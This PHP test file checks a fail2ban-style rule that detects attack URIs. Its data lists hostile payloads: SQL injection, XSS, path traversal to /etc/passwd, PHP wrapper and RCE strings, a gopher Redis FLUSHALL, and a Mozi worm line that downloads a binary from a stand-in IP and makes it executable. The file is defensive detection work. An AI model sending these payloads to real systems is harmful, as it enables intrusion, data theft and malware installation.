<?php

namespace Maximus\Fail2Ban\Tests\Feature\Rules;

use Maximus\Fail2Ban\Rules\AttackPattern;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Group;
use PHPUnit\Framework\Attributes\Test;

class AttackPatternTest extends RuleTestCase
{
    public static function attacks(): array
    {
        return [
            // SQL 注入
            '引号恒真' => ['/v1/prepay/x?id=1%27%20or%20%271%27%3D%271'],
            '引号恒真 加号空格' => ['/merchant/deposit-orders?merchant_order_no=1%27+OR+1%3D1--'],
            'union select' => ['/merchant/deposit-orders?order_no=1+UNION+ALL+SELECT+NULL,NULL--'],
            'union 注释分隔' => ['/merchant/deposit-orders?order_no=1/**/union/**/select/**/1,2'],
            'union 编码注释' => ['/merchant/deposit-orders?order_no=1%2F**%2Funion%2F*!50000select*%2F%201'],
            'union 大小写混写' => ['/x?q=1%20UnIoN%20SeLeCt%201'],
            'union 空字节' => ['/x?q=1%20un%00ion%20select%201'],
            'sleep' => ['/x?id=1%20AND%20SLEEP(5)'],
            '子查询 sleep' => ['/x?id=(select*from(select(sleep(5)))a)'],
            'benchmark' => ['/x?id=1%20and%20benchmark(5000000,md5(1))'],
            'information_schema' => ['/x?q=1%20and%201=(select%20count(*)%20from%20information_schema.tables)'],
            '@@version' => ['/x?q=@@version'],
            '双层编码恒真' => ['/x?id=1%2527%2520or%25201%253D1'],
            'waitfor' => ["/x?id=1';waitfor%20delay%20'0:0:5'--"],
            // 跨站脚本
            'script 标签' => ['/x?q=<script>alert(1)</script>'],
            'script 编码' => ['/x?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E'],
            'script 双层编码' => ['/x?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E'],
            'script 三层编码' => ['/x?q=%25253Cscript%25253E'],
            'script 大写' => ['/x?q=%3CSCRIPT%20SRC=//x.y/z%3E'],
            'img onerror' => ['/x?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'],
            'svg onload' => ['/x?q=<svg/onload=alert(1)>'],
            'javascript 伪协议' => ['/x?return_url=javascript:alert(document.cookie)'],
            '路径里的脚本' => ['/%3Cscript%3Ealert(1)%3C/script%3E'],
            '参数名里的脚本' => ['/x?%3Cscript%3E=1'],
            // 路径穿越与本地文件
            '路径穿越编码斜杠' => ['/static/..%2f..%2f..%2fetc/passwd'],
            '路径穿越参数' => ['/x?file=../../../../etc/passwd'],
            '路径穿越反斜杠' => ['/x?file=..%5c..%5cwindows%5cwin.ini'],
            '路径穿越编码点' => ['/%2e%2e/%2e%2e/etc/passwd'],
            '路径穿越双层编码' => ['/%252e%252e%252f%252e%252e%252fetc%252fpasswd'],
            '路径穿越三层编码' => ['/x?f=%25252e%25252e%25252f'],
            '路径穿越空字节' => ['/x?file=../../etc/passwd%00.png'],
            'php 伪协议' => ['/x?page=php://filter/convert.base64-encode/resource=index'],
            'file 协议' => ['/x?url=file:///etc/passwd'],
            'gopher' => ['/x?u=gopher://127.0.0.1:6379/_FLUSHALL'],
            '/proc/self' => ['/x?f=/proc/self/environ'],
            // 命令执行
            '分号 whoami' => ['/x?ip=127.0.0.1;whoami'],
            '管道 cat' => ['/x?cmd=|cat%20/etc/passwd'],
            '子命令' => ['/x?x=$(whoami)'],
            '反引号' => ['/x?x=`uname%20-a`'],
            'Mozi 蠕虫' => ['/shell?cd+/tmp;rm+-rf+*;wget+http://192.0.2.1:8088/Mozi.a;chmod+777+Mozi.a'],
            'IFS' => ['/x?a=${IFS}cat${IFS}/etc/passwd'],
            'shellshock' => ['/cgi?x=()%20%7B%20:;%20%7D;%20/bin/bash%20-c%20id'],
            'ThinkPHP' => ['/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1'],
            'PHP-CGI 参数注入' => ['/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'],
            'OGNL' => ['/x?redirect=%25%7B(%23a%3D1)%7D'],
            'php 代码' => ['/x?c=%3C%3Fphp%20system(%27id%27)%3B'],
            // PHP 注入（2026-11-07 按 CRS 933 补充）
            'php 短输出标签' => ['/x?c=%3C%3F%3D%60id%60%3F%3E'],
            'pearcmd 写文件' => ['/?+config-create+/&lang=../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+/tmp/a.php'],
            'phpinfo 调用' => ['/x?f=phpinfo()'],
            'phpinfo 调用带空格' => ['/x?f=phpinfo%20%28%29'],
            '超全局变量' => ['/x?c=eval($_POST[1])'],
            '超全局变量编码' => ['/x?c=%24_GET%5Bx%5D'],
            '序列化对象' => ['/x?data=O:8:%22stdClass%22:1:%7Bs:1:%22a%22;i:1;%7D'],
            '序列化对象带命名空间' => ['/x?d=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7B'],
            'compress.zlib 包装器' => ['/x?f=compress.zlib://php://input'],
            'bzip2 包装器' => ['/x?f=compress.bzip2:///etc/passwd'],
            'rar 包装器' => ['/x?f=rar:///tmp/a.rar'],
            'ssh2 包装器' => ['/x?f=ssh2.exec://user@host/id'],
        ];
    }

    #[Test]
    #[DataProvider('attacks')]
    public function attack_fragments_match(string $uri): void
    {
        $this->assertTrue((new AttackPattern)->matches($this->makeRequest('GET', $uri), $this->response(200)), $uri);
    }

    #[Test]
    public function four_layers_of_encoding_are_not_decoded(): void
    {
        // 解码上限是三层（Subject::DECODE_MAX）。四层编码的 "../" 不再解开。
        $this->assertFalse((new AttackPattern)->matches(
            $this->makeRequest('GET', '/x?f=%2525252e%2525252e%2525252f'),
            $this->response(200),
        ));
    }

    #[Test]
    public function connect_and_trace_match(): void
    {
        $rule = new AttackPattern;

        $this->assertTrue($rule->matches($this->makeRequest('CONNECT', 'example.com:443'), $this->response(400)));
        $this->assertTrue($rule->matches($this->makeRequest('TRACE', '/'), $this->response(405)));
        $this->assertTrue($rule->matches($this->makeRequest('trace', '/'), $this->response(405)));
    }

    #[Test]
    public function absolute_form_request_target_matches(): void
    {
        $rule = new AttackPattern;

        $this->assertTrue($rule->matches(
            $this->makeRequest('GET', 'http://example.com/', ['Host' => 'example.com']),
            $this->response(404),
        ));
        $this->assertTrue($rule->matches(
            $this->makeRequest('GET', 'HTTPS://www.google.com:443/search?q=1'),
            $this->response(404),
        ));
    }

    public static function normalMethods(): array
    {
        return [
            ['GET', '/v1/prepay/abc'],
            ['HEAD', '/v1/prepay/abc'],
            ['POST', '/v1/transactions/pay'],
            ['PUT', '/v1/prepay/abc'],
            ['PATCH', '/merchant/merchant-withdrawal-orders/5/cancel'],
            ['DELETE', '/merchant/deposit-orders/123'],
            ['OPTIONS', '/v1/transactions/pay'],
        ];
    }

    #[Test]
    #[DataProvider('normalMethods')]
    public function ordinary_methods_do_not_match(string $method, string $uri): void
    {
        $this->assertFalse((new AttackPattern)->matches($this->makeRequest($method, $uri), $this->response(200)));
    }

    public static function ordinaryQueries(): array
    {
        return [
            '回调地址原样' => ['/v1/prepay/abc?notify_url=https://shop.example.com/notify/in/29&return_url=https://shop.example.com/back/in/29'],
            '回调地址编码' => ['/v1/prepay/abc?notify_url=https%3A%2F%2Fshop.example.com%2Fnotify%2Fin%2F29'],
            '回调地址带 php 与查询串' => ['/x?return_url=https%3A%2F%2Fshop.example.com%2Fpay%2Fresult.php%3Forder%3D1%26status%3Dok'],
            '回调地址双层编码' => ['/x?return_url=https%253A%252F%252Fshop.example.com%252Fback%253Fa%253D1'],
            '普通英文' => ['/merchant/deposit-orders?description=please+select+the+union+plan+and+run+the+script'],
            '普通英文二' => ['/merchant/deposit-orders?description=Select%20union%20members%20from%20the%20list'],
            '普通英文三' => ['/merchant/deposit-orders?description=script+kiddie+alert+prompt+confirm+document+sleep'],
            '撇号' => ['/merchant/deposit-orders?description=Tom%27s+order+or+not'],
            '中文' => ['/merchant/deposit-orders?description=%E8%AE%A2%E5%8D%95%E6%B5%8B%E8%AF%95%EF%BC%88%E9%80%80%E6%AC%BE%EF%BC%89'],
            '中文原样' => ['/portal/api/deposit-orders?keyword=测试 订单'],
            '签名' => ['/x?sign=osaULzwzws3Czoo%2B1KRXA5MSy1cv4wLTEdtFTCsFiJiqSG5LeAAyw6jjSjv%2B69gmydG0uHPdpdioV2TcsZbtEw6A7OtzlNECmW3TPMmIdZ6tYA%2Fdn%2BZufquQpiN4eNirEO0sTDOEbPw5pRTD4NXLkl6AzQkiiWWEmWlLRVhbPMqO%2FK1BeQpsfxkDmddNGTuPV7tUNWMUVwFOrWEpH3ErQ1ctosgT%2BPhbNZbGcSBW%2BafjCYoJ3wjk%2BxCcAaBsDYQRhZiyyRQrPOhcwgjzeFENve41TixGrUq2QrkMIhhEvlHs%2BXOwv%2FoHDa5fpnl9D0JKuU5RUAg0JFpcNm1HgDfs8o%3D%3D&timestamp=1700000000&nonce=bb516e65-265e-4e5b-88c3-bab2cec79213'],
            '签名原样带加号斜杠' => ['/x?sign=osaULzwzws3Czoo+1KRXA5MSy1cv4wLTE/tFTCsFiJ==&mchid=1024'],
            'base64' => ['/x?data=eyJvdXRfdHJhZGVfbm8iOiI5MDAwMDAwMDAwMDAwMDAwMDEifQ%3D%3D'],
            '时间与时区' => ['/x?expired_at=2026-11-02T08:30:00%2B00:00&start_date=2026-11-01&end_date=2026-11-07'],
            '时间范围' => ['/portal/api/deposit-orders?range=custom&custom_range=2026-11-01+~+2026-11-07'],
            '邮箱' => ['/merchant/auth/verify-identifier?identifier=merchant%40example.com'],
            '百分号' => ['/merchant/deposit-orders?description=100%25+success'],
            '省略号' => ['/merchant/deposit-orders?description=loading...'],
            '括号' => ['/merchant/deposit-orders?description=(%E6%B5%8B%E8%AF%95)+v1.2'],
            '钱包地址' => ['/merchant/deposit-orders?to_address=0xeb6CD206dCaFCFC39AC09aFDD1dFf8DD10B06A4D&chain=ETH'],
            '数组参数' => ['/merchant/deposit-orders?status[]=1&status[]=2&hash_ids[]=abc'],
            '分页' => ['/merchant/deposit-orders?page=2&per_page=20&chain=TRON&token_id=1&merchant_order_no=900000000000000001'],
            '下载' => ['/merchant/deposit-orders/export?is_download=1&start_date=2026-11-01'],
            '分号' => ['/x?cb=https%3A%2F%2Fshop.example.com%2Fcb%3Bjsessionid%3DABC123'],
            '管道' => ['/x?description=A+%7C+B'],
            '与号' => ['/x?description=A%26%26B+Co'],
            '美元' => ['/x?description=%2410+off'],
            '小于号' => ['/x?description=amount%3C100+online%3D1'],
            '空查询' => ['/v1/prepay/abc?'],
            // 与 2026-11-07 补充的 PHP 注入特征相近的正常写法
            '以 O 开头的订单号' => ['/x?order_no=O:123&ref=C:45'],
            '冒号与引号' => ['/x?description=%22o%3A1%3A%22+test'],
            'phpinfo 单词' => ['/x?description=phpinfo+page+missing'],
            '美元下划线' => ['/x?description=%24_price+list'],
            '问号等号' => ['/x?description=why%3F%3Dbecause'],
            'zip 单词' => ['/x?description=zlib+compress+bzip2+rar+ogg+files'],
        ];
    }

    #[Test]
    #[DataProvider('ordinaryQueries')]
    public function ordinary_parameters_do_not_match(string $uri): void
    {
        $this->assertFalse((new AttackPattern)->matches($this->makeRequest('GET', $uri), $this->response(200)), $uri);
    }

    public static function prefilteredTraffic(): array
    {
        return [
            ['/v1/transactions/pay'],
            ['/v1/prepay/4442ed3ed642f7308babe09b9007675ed487e0309a82d?locale=zh&t=1700000000'],
            ['/merchant/deposit-orders?page=1&per_page=20&chain=TRON&token_id=1&status=1&start_date=2026-11-01&end_date=2026-11-07&merchant_order_no=900000000000000001'],
            ['/v1/prepay/abc?notify_url=https%3A%2F%2Fshop.example.com%2Fnotify&return_url=https%3A%2F%2Fshop.example.com%2Fback%3Fid%3D1'],
            ['/merchant/deposit-orders?description=%E6%B5%8B%E8%AF%95%E8%AE%A2%E5%8D%95'],
            ['/v1/prepay/abc?sign=osaULzwzws3Czoo%2B1KRXA5MSy1cv4wLTE%2FtFTCsFiJ%3D%3D&timestamp=1700000000&nonce=bb516e65-265e-4e5b-88c3-bab2cec79213'],
            ['/portal/api/deposit-orders?keyword=TXYZ&range=custom&custom_range=2026-11-01+~+2026-11-07&page=2'],
            ['/merchant/auth/verify-identifier?identifier=merchant%40example.com'],
        ];
    }

    #[Test]
    #[DataProvider('prefilteredTraffic')]
    public function typical_host_requests_stop_at_the_prefilter(string $uri): void
    {
        $rule = new class extends AttackPattern
        {
            public function prefilter(\Maximus\Fail2Ban\Rules\Support\Subject $subject): bool
            {
                return $this->suspicious($subject);
            }
        };

        $this->assertFalse($rule->prefilter(\Maximus\Fail2Ban\Rules\Support\Subject::of($this->makeRequest('GET', $uri))), $uri);
    }

    #[Test]
    public function request_body_is_not_inspected(): void
    {
        $this->assertFalse((new AttackPattern)->matches(
            $this->makeRequest('POST', '/v1/transactions/pay', ['Content-Type' => 'application/json'], '{"out_trade_no":"1\' or 1=1--","notify_url":"<script>alert(1)</script>"}'),
            $this->response(200),
        ));
    }

    #[Test]
    public function key_is_path_and_query(): void
    {
        $rule = new AttackPattern;

        $a = $rule->key($this->makeRequest('GET', '/x?id=1%27%20or%201=1'));
        $b = $rule->key($this->makeRequest('GET', '/x?id=1%27%20or%201=1'));
        $c = $rule->key($this->makeRequest('GET', '/x?id=2%27%20or%201=1'));

        // 去重键一律是完整地址的摘要，查询串原文（可能带签名、令牌）不进 Redis。
        $this->assertSame('sha1:'.sha1('/x?id=1%27%20or%201=1'), $a);
        $this->assertSame($a, $b);
        $this->assertNotSame($a, $c);
    }

    #[Test]
    public function long_uris_use_a_digest_key(): void
    {
        $uri = '/x?q='.str_repeat('a', 300).'%27%20or%201=1';
        $key = (new AttackPattern)->key($this->makeRequest('GET', $uri));

        $this->assertSame('sha1:'.sha1($uri), $key);
    }

    public static function pathologicalInputs(): array
    {
        return [
            '大量尖括号' => ['/x?q='.str_repeat('%3Ca%20', 3000)],
            '大量引号' => ['/x?q='.str_repeat('%27or%20', 3000)],
            '大量分隔符' => ['/x?q='.str_repeat(';nc%20-', 3000)],
            '大量查找表达式' => ['/x?q='.str_repeat('$%7B', 3000)],
            '超长路径' => ['/'.str_repeat('..a/', 4000)],
            '大量参数' => ['/x?'.str_repeat('a=%3C&', 3000)],
            '大量注释' => ['/x?q='.str_repeat('/*', 4000)],
        ];
    }

    #[Test]
    #[DataProvider('pathologicalInputs')]
    public function pathological_inputs_do_not_break_the_regex(string $uri): void
    {
        $this->hitIds($this->makeRequest('GET', $uri, ['User-Agent' => str_repeat('$%7B', 2000)]), $this->response(404));

        $this->assertSame(PREG_NO_ERROR, preg_last_error(), preg_last_error_msg());
    }

    #[Test]
    #[Group('benchmark')]
    #[DataProvider('pathologicalInputs')]
    public function pathological_inputs_finish_quickly(string $uri): void
    {
        $request = $this->makeRequest('GET', $uri, ['User-Agent' => str_repeat('$%7B', 2000)]);

        $start = hrtime(true);
        $this->hitIds($request, $this->response(404));
        $elapsedMs = (hrtime(true) - $start) / 1e6;

        $this->assertLessThan(200, $elapsedMs, "检测耗时 {$elapsedMs} ms");
    }
}
